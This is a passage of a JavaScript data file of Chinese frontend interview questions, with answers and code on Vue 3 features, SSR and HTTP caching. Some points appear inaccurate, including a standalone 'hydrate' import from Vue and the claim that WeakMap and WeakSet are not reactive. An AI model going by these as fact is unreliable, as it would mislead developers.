首次渲染动画\n<transition name="fade" appear>\n  <div>页面加载就动画</div>\n</transition>\n\n// 5. JavaScript 钩子（GSAP）\n<transition\n  @enter="onEnter"\n  @leave="onLeave"\n  :css="false"\n>\n  <div v-if="show">内容</div>\n</transition>\n<script setup>\nimport gsap from "gsap"\nfunction onEnter(el, done) {\n  gsap.fromTo(el, { opacity: 0, y: 50 }, { opacity: 1, y: 0, duration: 0.5, onComplete: done })\n}\nfunction onLeave(el, done) {\n  gsap.to(el, { opacity: 0, y: -50, duration: 0.5, onComplete: done })\n}\n</script>\n\n// 6. transition-group 列表动画\n<transition-group name="list" tag="ul">\n  <li v-for="item in list" :key="item.id">{{ item.name }}</li>\n</transition-group>\n<style>\n.list-enter-from, .list-leave-to { opacity: 0; transform: translateX(30px); }\n.list-enter-active, .list-leave-active { transition: all 0.3s; }\n.list-leave-active { position: absolute; } /* 离开时脱离布局 */\n.list-move { transition: transform 0.3s; } /* 位置移动动画 */\n</style>`,
                difficulty: 'medium',
                tags: ['Vue', 'transition', '动画'],
                keyPoints: ['6 个 CSS 类名 v-enter/leave', 'enter/leave 自动添加类', 'JavaScript 钩子配合动画库', 'transition-group 列表动画'],
              },
              {
                id: 'vue-fragment-multiple-root',
                domain: 'vue',
                question: 'Vue 3 Fragment 多根节点是什么？Vue 2 为何只能单根？',
                shortAnswer: 'Vue 3 支持组件多根节点（Fragment），模板可有多个根元素。Vue 2 必须单根，因 Vue 2 组件实例需挂载到单个 DOM 节点。Vue 3 用 Fragment 包裹多根，不产生额外 DOM。',
                detailedAnswer: 'Fragment 多根节点：\n\nVue 3：\n- 组件模板可有多个根元素\n- 内部用 Fragment 包裹（虚拟节点类型）\n- 不产生额外真实 DOM\n- 编译为多根 vnode 数组\n\nVue 2：\n- 必须单根元素\n- 组件实例需挂载到单个 DOM 节点\n- 多根会报错：Component template should contain exactly one root element\n\n为何 Vue 2 要单根：\n- Vue 2 组件实例 $el 指向单个 DOM 节点\n- 挂载/更新逻辑依赖单根\n- 单根便于属性继承（$attrs、事件监听）\n- 历史原因（早期设计选择）\n\nVue 3 如何实现多根：\n- 引入 Fragment vnode 类型\n- 多根编译为 Fragment 包裹的 vnode 数组\n- Fragment 本身不渲染 DOM\n- 挂载/更新遍历子节点\n\n对比：\n```\n// Vue 2（必须单根）\n<template>\n  <div> <!-- 必须包一层 -->\n    <header>...</header>\n    <main>...</main>\n    <footer>...</footer>\n  </div>\n</template>\n\n// Vue 3（多根）\n<template>\n  <header>...</header>\n  <main>...</main>\n  <footer>...</footer>\n</template>\n```\n\n多根的注意事项：\n\n1. 属性继承（$attrs）：\n- 单根：$attrs 自动继承到根元素\n- 多根：需显式指定继承到哪个元素\n```\n<!-- 多根时需声明 inheritAttrs: false 或手动绑定 -->\n<template>\n  <header>...</header>\n  <main v-bind="$attrs">...</main> <!-- 显式绑定 -->\n  <footer>...</footer>\n</template>\n```\n\n2. 事件监听：\n- 单根：自动绑定到根元素\n- 多根：需显式绑定\n\n3. ref：\n- 单根：ref 指向根 DOM\n- 多根：ref 指向第一个根元素（或 Fragment）\n\n使用场景：\n1. 减少无意义包裹 div：\n- 避免多余 DOM 节点\n- 简化 CSS 选择器层级\n- 减少 DOM 树深度\n\n2. 列表项/表格行：\n- 多个 td 直接作为组件根\n- 避免包裹 tr/div 破坏表格结构\n\n3. 灵活布局：\n- Flex/Grid 直接用多根\n- 不需额外容器\n\n4. 函数式组件：\n- 返回多根更自然\n\n注意：\n- 多根不影响逻辑（props/emit/inject 正常）\n- 主要影响 $attrs 继承和 ref\n- 用 inheritAttrs: false + 手动绑定处理',
                codeExample: `// 1. Vue 3 多根基础\n<template>\n  <header>Header</header>\n  <main>Content</main>\n  <footer>Footer</footer>\n</template>\n// 渲染为三个 DOM 节点，无额外包裹\n\n// 2. Vue 2 必须单根（需包裹）\n<template>\n  <div class="wrapper"> <!-- 多余的包裹 -->\n    <header>Header</header>\n    <main>Content</main>\n    <footer>Footer</footer>\n  </div>\n</template>\n\n// 3. 多根属性继承\n<!-- 父组件 -->\n<MyInput class="large" placeholder="输入" />\n\n<!-- MyInput.vue（多根） -->\n<script setup>\ndefineOptions({ inheritAttrs: false })\n</script>\n<template>\n  <label>Label</label>\n  <input v-bind="$attrs" /> <!-- 显式绑定 class/placeholder -->\n  <span>Hint</span>\n</template>\n\n// 4. 表格组件多根\n<!-- TableRow.vue -->\n<template>\n  <td>{{ name }}</td>\n  <td>{{ age }}</td>\n  <td>{{ email }}</td>\n</template>\n<!-- 父组件 -->\n<table>\n  <tr v-for="user in users" :key="user.id" is="vue:TableRow" :user="user" />\n</table>\n// 多根避免破坏 <tr><td></td></tr> 结构\n\n// 5. Fragment 虚拟节点\n// Vue 3 编译后（简化）\nconst vnode = {\n  type: Symbol(Fragment),\n  children: [\n    { type: "header", children: "Header" },\n    { type: "main", children: "Content" },\n    { type: "footer", children: "Footer" },\n  ],\n}\n// Fragment 本身不渲染 DOM，只包裹子节点`,
                difficulty: 'medium',
                tags: ['Vue3', 'Fragment', '多根节点'],
                keyPoints: ['Vue 3 支持多根 Fragment', 'Vue 2 必须单根', 'Fragment 不渲染额外 DOM', '多根需显式绑定 $attrs'],
              },
              {
                id: 'vue-reactive-collections',
                domain: 'vue',
                question: 'Vue 3 reactive 如何处理 Map/Set/WeakMap？',
                shortAnswer: 'Vue 3 用 Proxy 的 collection handlers 处理 Map/Set/WeakMap/WeakSet。代理 get 拦截集合方法（add/delete/has/forEach/iterate），调用时绑定原对象并触发 track/trigger。Vue 2 无法响应式监听集合。',
                detailedAnswer: 'Vue 3 集合响应式：\n\nVue 2 限制：\n- Object.defineProperty 无法劫持 Map/Set 方法\n- Vue 2 不支持 Map/Set 响应式\n- 需用 Vue.set 或重置整个对象\n\nVue 3 方案：\n- Proxy 可代理整个对象\n- 对 Map/Set 用专门的 collection handlers\n- 拦截集合方法触发 track/trigger\n\ncollection handlers 拦截：\n\nget(target, key, receiver)：\n- 返回的方法被包装\n- add/delete/has/clear/set 等触发 trigger\n- get/forEach/iterate 触发 track\n\n原理：\n```\nconst proxy = new Proxy(target, {\n  get(target, key, receiver) {\n    if (key === "add" || key === "delete" || key === "clear") {\n      // 包装方法：调用后 trigger\n      return (...args) => {\n        const result = target[key].apply(target, args)\n        trigger(target, key)\n        return result\n      }\n    }\n    if (key === "get" || key === "has" || key === "forEach") {\n      // 包装方法：调用前 track\n      track(target, key)\n      return target[key].bind(target)\n    }\n    return Reflect.get(target, key, receiver)\n  },\n})\n```\n\n使用示例：\n```\nimport { reactive, effect } from "vue"\n\nconst state = reactive({\n  map: new Map([["a", 1]]),\n  set: new Set([1, 2, 3]),\n})\n\neffect(() => {\n  console.log(state.map.get("a")) // 1\n})\n\nstate.map.set("a", 2) // 触发 effect\nstate.map.delete("a") // 触发 effect\nstate.set.add(4)      // 触发 effect\nstate.set.delete(1)   // 触发 effect\n```\n\n支持的集合：\n- Map：get/set/has/delete/clear/forEach/iterate\n- Set：add/has/delete/clear/forEach/iterate\n- WeakMap：仅 get/set/has/delete（弱引用，不触发 track）\n- WeakSet：仅 add/has/delete\n\n注意事项：\n1. WeakMap/WeakSet 弱引用，不参与响应式：\n- 不会被 track/trigger\n- 适合缓存、元数据存储\n\n2. 替换整个集合：\n- reactive({ map: new Map() })\n- state.map = new Map() // ✅ 替换触发更新\n- state.map.set("a", 1) // ✅ 方法调用触发更新\n\n3. 解构集合方法：\n```\nconst map = reactive(new Map())\nconst { get } = map // ❌ 失去 this\nget("a") // 报错\n// 解决：用 bind\nconst get = map.get.bind(map)\n```\n\n4. 迭代响应式：\n```\nconst set = reactive(new Set([1, 2, 3]))\nfor (const item of set) { ... } // 触发 track\nconst [first] = set // 触发 track\n```\n\n5. 与 ref 配合：\n```\nconst map = reactive(new Map([["count", ref(0)]]))\nmap.get("count").value++ // ref 解包后修改\n```',
                codeExample: `// 1. Map 响应式\nimport { reactive, watchEffect } from "vue"\nconst state = reactive({\n  users: new Map(),\n})\n\nwatchEffect(() => {\n  console.log("用户数:", state.users.size)\n})\n\nstate.users.set("u1", { name: "Alice" }) // 触发 effect\nstate.users.set("u2", { name: "Bob" })   // 触发 effect\nstate.users.delete("u1")                  // 触发 effect\nstate.users.clear()                       // 触发 effect\n\n// 2. Set 响应式\nconst tags = reactive(new Set(["vue", "react"]))\nwatchEffect(() => {\n  console.log("标签:", [...tags])\n})\n\ntags.add("angular") // 触发\ntags.delete("react") // 触发\n\n// 3. 迭代响应式集合\nconst list = reactive(new Set([1, 2, 3]))\nconst sum = computed(() => {\n  let total = 0\n  for (const n of list) total += n // 触发 track\n  return total\n})\nlist.add(4) // sum 自动更新\n\n// 4. WeakMap 不响应式（用于元数据）\nconst meta = new WeakMap()\nconst obj1 = {}\nconst obj2 = {}\nmeta.set(obj1, { timestamp: Date.now() })\nmeta.set(obj2, { timestamp: Date.now() })\n// meta 不会被 track/trigger，obj 被回收时自动清理\n\n// 5. Vue 2 无法响应式 Map/Set（对比）\n// Vue 2\nnew Vue({\n  data: { map: new Map() },\n  mounted() {\n    this.map.set("a", 1) // ❌ 不触发更新\n    this.$forceUpdate()  // 强制更新（不优雅）\n  },\n})`,
                difficulty: 'hard',
                tags: ['Vue3', 'Map', 'Set', '集合响应式'],
                keyPoints: ['Vue 3 用 collection handlers 代理集合', '拦截方法触发 track/trigger', 'Vue 2 不支持集合响应式', 'WeakMap/WeakSet 不参与响应式'],
              },
              {
                id: 'vue-async-components',
                domain: 'vue',
                question: 'Vue 异步组件的原理和 defineAsyncComponent 用法？',
                shortAnswer: '异步组件按需加载，首次渲染才执行 loader（import()）。defineAsyncComponent 配置 loader、loadingComponent、errorComponent、delay、timeout。原理：组件渲染时返回异步占位，loader resolve 后才真正渲染。',
                detailedAnswer: '异步组件作用：\n- 按需加载（代码分割）\n- 减小初始 bundle\n- 优化首屏加载\n\nVue 2 vs Vue 3 写法：\n```\n// Vue 2\nconst AsyncComp = () => import("./Comp.vue")\n// 或\nconst AsyncComp = {\n  component: () => import("./Comp.vue"),\n  loading: LoadingComp,\n  error: ErrorComp,\n  delay: 200,\n  timeout: 3000,\n}\n\n// Vue 3\nimport { defineAsyncComponent } from "vue"\nconst AsyncComp = defineAsyncComponent(() => import("./Comp.vue"))\n// 或\nconst AsyncComp = defineAsyncComponent({\n  loader: () => import("./Comp.vue"),\n  loadingComponent: LoadingComp,\n  errorComponent: ErrorComp,\n  delay: 200,\n  timeout: 3000,\n  suspensible: false, // 是否触发 Suspense（默认 true）\n  onError(err, retry, fail, attempts) {\n    if (attempts <= 3) retry()\n    else fail()\n  },\n})\n```\n\nOptions 说明：\n- loader：必填，返回 Promise 的加载函数\n- loadingComponent：加载中显示的组件\n- errorComponent：加载失败显示的组件\n- delay：显示 loading 前的延迟（默认 200ms，避免闪烁）\n- timeout：超时时间，超时显示 errorComponent\n- suspensible：是否配合 Suspense（默认 true）\n- onError：错误处理（可重试）\n\n原理：\n1. defineAsyncComponent 返回一个包装组件\n2. 首次渲染时，调用 loader() 返回 Promise\n3. 加载期间显示 loadingComponent\n4. Promise resolve：注册组件，重新渲染显示真实组件\n5. Promise reject：显示 errorComponent\n6. 超时：显示 errorComponent\n\n状态机：\n- pending（加载中）→ resolved（成功）/ rejected（失败）\n- resolved 后缓存组件，不再重复加载\n\n使用场景：\n1. 路由懒加载：\n```\nconst routes = [\n  { path: "/about", component: () => import("./About.vue") },\n]\n```\n\n2. 大组件按需加载：\n- 图表组件\n- 富文本编辑器\n- 复杂表单\n\n3. 条件渲染组件：\n```\nconst HeavyComp = defineAsyncComponent(() => import("./Heavy.vue"))\n<HeavyComp v-if="show" />\n```\n\n4. 权限组件：\n- 根据用户权限加载不同组件\n\n与 Suspense 配合：\n- 默认 suspensible: true，触发外层 Suspense\n- 设置 false 时独立 loading（不触发 Suspense）\n\n错误重试：\n```\nconst AsyncComp = defineAsyncComponent({\n  loader: () => import("./Comp.vue"),\n  onError(err, retry, fail, attempts) {\n    if (attempts <= 3) {\n      setTimeout(retry, 1000) // 1s 后重试\n    } else {\n      fail()\n    }\n  },\n})\n```\n\nWebpack/Vite 代码分割：\n- import() 触发代码分割\n- 自动生成单独 chunk\n- 按需加载',
                codeExample: `// 1. 基础异步组件\nimport { defineAsyncComponent } from "vue"\n\nconst AsyncChart = defineAsyncComponent(() => import("./Chart.vue"))\n\nexport default {\n  components: { AsyncChart },\n  template: "<AsyncChart />",\n}\n\n// 2. 完整配置\nimport LoadingSpinner from "./LoadingSpinner.vue"\nimport ErrorMsg from "./ErrorMsg.vue"\n\nconst AsyncEditor = defineAsyncComponent({\n  loader: () => import("./RichEditor.vue"),\n  loadingComponent: LoadingSpinner,\n  errorComponent: ErrorMsg,\n  delay: 200,  // 200ms 后显示 loading\n  timeout: 5000, // 5s 超时\n  onError(err, retry, fail, attempts) {\n    console.error("加载失败", err)\n    if (attempts <= 3) {\n      setTimeout(retry, 1000) // 重试\n    } else {\n      fail()\n    }\n  },\n})\n\n// 3. 路由懒加载\nimport { createRouter } from "vue-router"\nconst routes = [\n  { path: "/", component: () => import("./Home.vue") },\n  { path: "/about", component: () => import("./About.vue") },\n  { path: "/dashboard", component: () => import("./Dashboard.vue") },\n]\nconst router = createRouter({ routes })\n\n// 4. 配合 Suspense\n<template>\n  <Suspense>\n    <template #default>\n      <AsyncComp />\n    </template>\n    <template #fallback>\n      <div>Loading...</div>\n    </template>\n  </Suspense>\n</template>\n<script setup>\nconst AsyncComp = defineAsyncComponent(() => import("./Comp.vue"))\n</script>\n\n// 5. 条件加载（避免初始 bundle 过大）\n<template>\n  <button @click="show = true">显示图表</button>\n  <AsyncChart v-if="show" :data="data" />\n</template>\n<script setup>\nimport { ref, defineAsyncComponent } from "vue"\nconst AsyncChart = defineAsyncComponent(() => import("./Chart.vue"))\nconst show = ref(false)\nconst data = ref([])\n</script>\n// 点击按钮才加载 Chart 组件，减小初始 bundle`,
                difficulty: 'medium',
                tags: ['Vue3', '异步组件', 'defineAsyncComponent', '代码分割'],
                keyPoints: ['按需加载减小 bundle', 'defineAsyncComponent 配置', 'loading/error/delay/timeout', '可重试可配合 Suspense'],
              },
              {
                id: 'vue-functional-components',
                domain: 'vue',
                question: 'Vue 函数式组件是什么？Vue 3 中如何写？',
                shortAnswer: '函数式组件是无状态、无实例的纯函数组件，接收 props 返回 vnode。Vue 2 用 functional: true，Vue 3 直接用函数即可。性能更好（无实例开销），适合简单展示组件。Vue 3 中普通函数组件默认就是函数式（无状态）。',
                detailedAnswer: '函数式组件特点：\n- 无状态（无 data/响应式数据）\n- 无实例（无 this，无生命周期）\n- 纯函数：接收 props，返回 vnode\n- 性能更好（无实例创建开销）\n- 适合简单展示组件\n\nVue 2 函数式组件：\n```\n// functional: true\nexport default {\n  functional: true,\n  props: ["title"],\n  render(h, ctx) {\n    return h("div", ctx.props.title)\n  },\n}\n```\n\nVue 3 函数式组件：\n```\n// 直接用函数（无需 functional: true）\nfunction MyButton(props, { slots, emit, attrs }) {\n  return h("button", { onClick: emit.click }, slots.default?.())\n}\nMyButton.props = ["title"] // 可选：声明 props\nexport default MyButton\n```\n\nVue 3 变化：\n- Vue 2 的 functional: true 已废弃\n- Vue 3 普通函数组件默认就是函数式\n- 性能提升使函数式组件优势减小\n- 大部分场景用普通组件即可\n\n函数式组件的第二个参数（context）：\n- props：组件 props\n- attrs：非 props 属性\n- slots：插槽对象\n- emit：触发事件\n- expose：暴露给父组件\n\n使用场景：\n1. 简单展示组件：\n```\nfunction Badge({ text }) {\n  return h("span", { class: "badge" }, text)\n}\n```\n\n2. 高阶组件（HOC）：\n```\nfunction withLoading(WrappedComp) {\n  return (props, ctx) => {\n    if (props.loading) return h(Loading)\n    return h(WrappedComp, props, ctx.slots)\n  }\n}\n```\n\n3. 编程式渲染：\n- 不需要模板编译\n- 完全用 h 函数\n- 适合动态结构\n\n4. 性能敏感场景：\n- 高频渲染组件\n- 大量实例\n- 无状态展示\n\nVue 3 推荐做法：\n- 普通组件用 <script setup> 或对象写法\n- 函数式组件用于：\n  - 简单无状态展示\n  - 高阶组件\n  - 编程式渲染\n- Vue 3 性能提升后，函数式组件优势减小\n\nTypeScript 支持：\n```\nimport { FunctionalComponent } from "vue"\ninterface MyCompProps {\n  title: string\n  count?: number\n}\nconst MyComp: FunctionalComponent<MyCompProps> = (props, { slots }) => {\n  return h("div", [props.title, slots.default?.()])\n}\nMyComp.props = {\n  title: String,\n  count: { type: Number, default: 0 },\n}\n```\n\n注意：\n- 函数式组件不能有 state（用 ref/reactive 需在 setup 中）\n- 不能用 this\n- 没有生命周期（但 Vue 3 函数式组件可注册 onMounted 等钩子）\n- 简单场景优先用 <script setup>',
                codeExample: `// 1. Vue 3 基础函数式组件\nimport { h } from "vue"\n\nfunction Greeting({ name }) {\n  return h("div", \`Hello, \${name}!\`)\n}\nGreeting.props = ["name"]\nexport default Greeting\n\n// 使用\n// <Greeting name="Alice" />\n\n// 2. 带插槽和事件\nfunction MyButton(props, { slots, emit, attrs }) {\n  return h(\n    "button",\n    {\n      class: ["btn", attrs.class],\n      onClick: () => emit("click"),\n    },\n    slots.default?.()\n  )\n}\nMyButton.props = ["type"]\nMyButton.emits = ["click"]\nexport default MyButton\n\n// 3. TypeScript\nimport { h, FunctionalComponent } from "vue"\ninterface BadgeProps {\n  text: string\n  color?: "red" | "green" | "blue"\n}\nconst Badge: FunctionalComponent<BadgeProps> = (props) => {\n  return h("span", { class: [\`badge-\${props.color || "blue"}\`] }, props.text)\n}\nBadge.props = {\n  text: { type: String, required: true },\n  color: { type: String, default: "blue" },\n}\nexport default Badge\n\n// 4. 高阶组件\nfunction withLoading<T>(WrappedComp: FunctionalComponent<T>) {\n  return (props: T & { loading?: boolean }, ctx) => {\n    if (props.loading) {\n      return h("div", { class: "loading" }, "Loading...")\n    }\n    return h(WrappedComp, props, ctx.slots)\n  }\n}\n// 使用\nconst AsyncUser = withLoading(UserCard)\n\n// 5. Vue 2 写法（对比）\n// Vue 2\nexport default {\n  functional: true,\n  props: ["title"],\n  render(h, ctx) {\n    return h("div", { class: "title" }, ctx.props.title)\n  },\n}\n// Vue 3 等价\nfunction Title({ title }) {\n  return h("div", { class: "title" }, title)\n}\nTitle.props = ["title"]`,
                difficulty: 'medium',
                tags: ['Vue3', '函数式组件', 'Functional Component'],
                keyPoints: ['无状态无实例纯函数', 'Vue 3 直接用函数', '接收 props 返回 vnode', '用于简单展示和 HOC'],
              },
              {
                id: 'vue-ssr',
                domain: 'vue',
                question: 'Vue SSR 的原理？同构应用如何工作？',
                shortAnswer: 'SSR 在服务端用 renderToString 把组件渲染成 HTML 字符串返回，客户端 hydrate 附加交互。同构：一套代码服务端渲染 HTML（SEO、首屏），客户端水合为 SPA。需注意服务端无 window/document、生命周期差异、数据预取。',
                detailedAnswer: 'Vue SSR 工作流程：\n\n1. 服务端渲染：\n- 请求到达服务端\n- 创建 Vue 应用实例\n- 用 renderToString(app) 渲染为 HTML 字符串\n- 注入初始数据（window.__INITIAL_STATE__）\n- 返回完整 HTML\n\n2. 客户端水合（Hydration）：\n- 浏览器接收 HTML\n- 加载 JS bundle\n- 创建同样的 Vue 应用实例\n- hydrate 把事件监听器附加到现有 DOM（不重新渲染）\n- 应用变为 SPA\n\n基本实现：\n```\n// server.js\nimport { createSSRApp } from "vue"\nimport { renderToString } from "vue/server-renderer"\n\nserver.get("*", async (req, res) => {\n  const app = createSSRApp(App)\n  const html = await renderToString(app)\n  res.send(\`\n    <!DOCTYPE html>\n    <html>\n      <body>\n        <div id="app">${html}</div>\n        <script>window.__INITIAL_STATE__ = ${JSON.stringify(state)}</script>\n        <script src="/client.js"></script>\n      </body>\n    </html>\n  `)\n})\n\n// client.js\nimport { createSSRApp } from "vue"\nconst app = createSSRApp(App)\nhydrate(app, document.getElementById("app")) // 水合\n```\n\n同构应用（Universal）：\n- 一套代码两端运行\n- 服务端：渲染 HTML\n- 客户端：水合 + 交互\n- 共享：组件、路由、store\n\n服务端 vs 客户端差异：\n\n| 维度 | 服务端 | 客户端 |\n|------|--------|--------|\n| 生命周期 | beforeCreate/created | 全部 |\n| window/document | ❌ | ✅ |\n| setTimeout/setInterval | 需清理 | 正常 |\n| 数据预取 | 必须同步 | 可异步 |\n| this.$ssrContext | ✅ | ❌ |\n\n数据预取：\n- 服务端渲染前获取数据\n- 序列化到 HTML（window.__INITIAL_STATE__）\n- 客户端 hydrate 时复用数据\n```\n// 服务端\nconst state = await fetchInitialData()\napp.provide("initialState", state)\n\n// 客户端\nconst state = window.__INITIAL_STATE__\napp.provide("initialState", state)\n```\n\n注意事项：\n1. 服务端无 window/document：\n- 用 import.meta.env.SSR 或 process.server 判断\n- 避免在 beforeCreate/created 中用\n\n2. 生命周期差异：\n- 服务端只执行 beforeCreate/created\n- mounted/updated 等仅客户端\n- onMounted 等组合式 API 仅客户端\n\n3. 副作用清理：\n- setTimeout/setInterval 需在 beforeUnmount 清理\n- 服务端不会有 unmounted，需手动清理\n\n4. 响应式：\n- 服务端禁用响应式（无需追踪）\n- Vue 3 SSR 自动优化\n\n5. 路由：\n- 服务端用 router.push(req.url)\n- 客户端正常路由\n\n6. 状态管理：\n- 服务端每次请求创建新 store 实例（避免污染）\n- 客户端复用 store\n\nSSR 优势：\n- SEO：爬虫拿到完整 HTML\n- 首屏快：无需等 JS 加载\n- 社交分享：OG 标签正确\n\nSSR 劣势：\n- 服务端压力大\n- 开发复杂（需考虑两端）\n- 部署复杂（需 Node 服务）\n\n框架选择：\n- Nuxt.js（Vue 生态，推荐）\n- 手动 SSR（学习原理）\n- SSG（静态生成，适合博客）\n- ISR（增量静态再生）',
                codeExample: `// 1. 基础 SSR\n// server.js (Express)\nimport express from "express"\nimport { createSSRApp } from "vue"\nimport { renderToString } from "vue/server-renderer"\nimport App from "./App.vue"\n\nconst app = express()\napp.use(express.static("public"))\n\napp.get("*", async (req, res) => {\n  const vueApp = createSSRApp(App)\n  const html = await renderToString(vueApp)\n  res.send(\`\n    <!DOCTYPE html>\n    <html>\n      <body>\n        <div id="app">\${html}</div>\n        <script type="module" src="/client.js"></script>\n      </body>\n    </html>\n  \`)\n})\napp.listen(3000)\n\n// client.js\nimport { createSSRApp } from "vue"\nimport { hydrate } from "vue"\nimport App from "./App.vue"\n\nconst app = createSSRApp(App)\nhydrate(app, document.getElementById("app"))\n\n// 2. 数据预取\n// store.js\nimport { reactive } from "vue"\nexport const createStore = () =>\n  reactive({\n    user: null,\n    async fetchUser() {\n      this.user = await fetch("/api/user").then((r) => r.json())\n    },\n  })\n\n// App.vue\nexport default {\n  async serverPrefetch() {\n    await this.$store.fetchUser() // 服务端预取\n  },\n  mounted() {\n    if (!this.$store.user) this.$store.fetchUser() // 客户端兜底\n  },\n}\n\n// server.js（注入初始状态）\napp.get("*", async (req, res) => {\n  const store = createStore()\n  const vueApp = createSSRApp(App, { store })\n  await renderToString(vueApp) // 触发 serverPrefetch\n  res.send(\`\n    <div id="app">\${html}</div>\n    <script>window.__INITIAL_STATE__ = \${JSON.stringify(store)}</script>\n  \`)\n})\n\n// client.js（复用状态）\nconst store = createStore()\nObject.assign(store, window.__INITIAL_STATE__)\nhydrate(createSSRApp(App, { store }), document.getElementById("app"))\n\n// 3. 环境判断\nimport { isServer } from "@/utils"\nif (!isServer) {\n  // 客户端逻辑\n  window.addEventListener("resize", handler)\n}\n\n// 4. Nuxt 3 示例（简化）\n// pages/index.vue\n<script setup>\n// 服务端和客户端都执行\nconst { data } = await useFetch("/api/posts")\n</script>\n<template>\n  <div v-for="post in data">{{ post.title }}</div>\n</template>\n// Nuxt 自动处理 SSR/Hydration/数据预取`,
                difficulty: 'hard',
                tags: ['Vue', 'SSR', '同构', 'Hydration'],
                keyPoints: ['服务端 renderToString 渲染 HTML', '客户端 hydrate 附加事件', '同构一套代码两端运行', '注意服务端无 window/生命周期差异'],
              },
              {
                id: 'vue-script-setup',
                domain: 'vue',
                question: 'Vue 3 的 <script setup> 语法糖有什么优势？和普通 setup() 函数有什么区别？',
                shortAnswer: '<script setup> 是 Vue 3 编译期语法糖：1) 顶层变量自动暴露给模板 2) 组件导入即可用无需注册 3) props/emits 用 defineProps/defineEmits 声明 4) 更好的 TS 类型推导 5) 编译后性能更优（无需运行时代理）。区别：语法糖编译期处理，setup() 运行时返回。',
                detailedAnswer: '<script setup> 优势：\n\n1. 自动暴露：\n- 顶层声明的变量/函数自动可在模板使用\n- 无需 return（普通 setup 需手动 return）\n- 导入的组件直接用，无需 components 注册\n\n2. 编译期宏：\n- defineProps：声明 props（无需引入）\n- defineEmits：声明 emits\n- defineExpose：暴露组件实例方法\n- defineModel：双向绑定（Vue 3.4+）\n- defineOptions：声明 name/inheritAttrs 等\n- defineSlots：声明插槽类型\n\n3. 性能优化：\n- 编译期生成更优代码\n- 模板变量直接引用（无需 setup 返回对象代理）\n- 更好的 tree-shaking\n\n4. TypeScript 友好：\n- props 类型直接用 TS 类型字面量\n- 自动推导 props/emits 类型\n- 泛型组件支持（generic 属性）\n\n区别对比：\n\n| 维度 | <script setup> | setup() 函数 |\n|------|----------------|--------------|\n| 变量暴露 | 顶层自动暴露 | 手动 return |\n| 组件注册 | 导入即用 | components 注册 |\n| props | defineProps | 函数参数 |\n| emits | defineEmits | context.emit |\n| 性能 | 编译期优化 | 运行时代理 |\n| TS 推导 | 更好 | 一般 |\n| 代码量 | 少 | 多 |\n| this | 无 | 有（组件实例） |\n\n使用注意：\n1. defineProps/defineEmits 是编译期宏，无需导入\n2. 不能在 <script setup> 中用 this\n3. 顶层 await 自动转 async setup（需 Suspense）\n4. useSlots/useAttrs 仍需从 vue 引入\n5. 命名冲突：顶层变量和 props 重名会报错',
                codeExample: `// 1. 基础用法
// UserCard.vue
<script setup>
import { ref, computed } from "vue"
import Avatar from "./Avatar.vue" // 导入即可用

// 顶层变量自动暴露
const count = ref(0)
const name = "Alice"

// 顶层函数自动暴露
function increment() {
  count.value++
}

// 计算属性
const double = computed(() => count.value * 2)
</script>

<template>
  <div>
    <Avatar /> <!-- 直接用 -->
    <p>{{ name }}: {{ count }} (x2 = {{ double }})</p>
    <button @click="increment">+1</button>
  </div>
</template>

// 2. props 和 emits
<script setup>
// defineProps 是编译期宏，无需引入
const props = defineProps({
  title: String,
  count: { type: Number, default: 0 }
})
const emit = defineEmits(["update", "delete"])

function handleClick() {
  emit("update", props.count + 1)
}
</script>

// 3. TypeScript 类型声明
<script setup lang="ts">
interface Props {
  title: string
  count?: number
  items?: string[]
}
const props = withDefaults(defineProps<Props>(), {
  count: 0,
  items: () => []
})

interface Emits {
  (e: "update", value: number): void
  (e: "delete", id: string): void
}
const emit = defineEmits<Emits>()
</script>

// 4. defineExpose（暴露方法给父组件 ref）
<script setup>
import { ref } from "vue"
const inputRef = ref(null)
function focus() {
  inputRef.value?.focus()
}
// 默认 <script setup> 不暴露任何东西，需手动 expose
defineExpose({ focus, inputRef })
</script>

// 父组件
<template>
  <ChildComp ref="child" />
  <button @click="child?.focus()">聚焦</button>
</template>

// 5. defineModel（Vue 3.4+ 双向绑定）
<script setup>
const model = defineModel<string>() // 等价 props modelValue + emit update:modelValue
</script>
<template>
  <input v-model="model" />
</template>

// 6. 顶层 await（需 Suspense）
<script setup>
const data = await fetch("/api/user").then(r => r.json())
// 编译为 async setup()
</script>

// 7. 普通 setup() 对比
export default {
  props: { title: String },
  setup(props, { emit }) {
    const count = ref(0)
    function increment() { count.value++ }
    // 必须手动 return
    return { count, increment }
  },
  components: { Avatar } // 必须注册
}`,
                difficulty: 'medium',
                tags: ['Vue3', 'script setup', '语法糖', 'Composition API'],
                keyPoints: ['顶层变量自动暴露无需 return', 'defineProps/defineEmits 编译期宏', '组件导入即用无需注册', 'TS 类型推导更优'],
              },
            ],
          },
        },
      ],
    },

    // ========================================================================
    // 知识点 4：网络八股
    // ========================================================================
    {
      order: 4,
      title: '网络八股',
      difficulty: 3,
      visualizationType: 'interview-quiz-engine',
      blocks: [
        {
          id: 'iv-p4-1',
          type: 'paragraph',
          lead: true,
          text: '网络面试八股覆盖 HTTP 缓存、HTTPS、跨域、TCP/UDP、DNS 等核心考点。以下通过问答引擎自测。',
        },
        {
          id: 'iv-p4-2',
          type: 'demo',
          visualizationType: 'interview-quiz-engine',
          data: {
            domain: 'network',
            mode: 'sequential',
            questions: [
              {
                id: 'network-http-cache',
                domain: 'network',
                question: 'HTTP 缓存策略的完整流程是什么？强缓存和协商缓存的区别？',
                shortAnswer: '强缓存（Cache-Control/Expires）不发请求直接用缓存；协商缓存（ETag/If-None-Match、Last-Modified/If-Modified-Since）发请求验证，304 则用缓存。强缓存优先。',
                detailedAnswer: 'HTTP 缓存分两级：\n\n1. 强缓存：浏览器直接用缓存，不发请求。由 Cache-Control（max-age、no-cache、no-store、public、private）和 Expires 控制。状态码 200（from cache）。\n\n2. 协商缓存：强缓存失效后，浏览器发请求验证缓存是否可用。由 ETag/If-None-Match 和 Last-Modified/If-Modified-Since 控制。可用返回 304 Not Modified，不可用返回 200 + 新资源。\n\n优先级：Cache-Control > Expires > ETag > Last-Modified\n\n完整流程：请求→检查强缓存→命中则用（200 from cache）→未命中检查协商缓存→发请求带 If-None-Match/If-Modified-Since→304 用缓存/200 新资源。',
                difficulty: 'hard',
                tags: ['HTTP缓存', '强缓存', '协商缓存', '面试必考'],
                keyPoints: ['强缓存不发请求', '协商缓存发请求验证', 'Cache-Control 优先于 Expires', 'ETag 优先于 Last-Modified'],
              },
              {
                id: 'network-cors',
                domain: 'network',
                question: '什么是跨域？CORS 的原理和解决方案有哪些？',
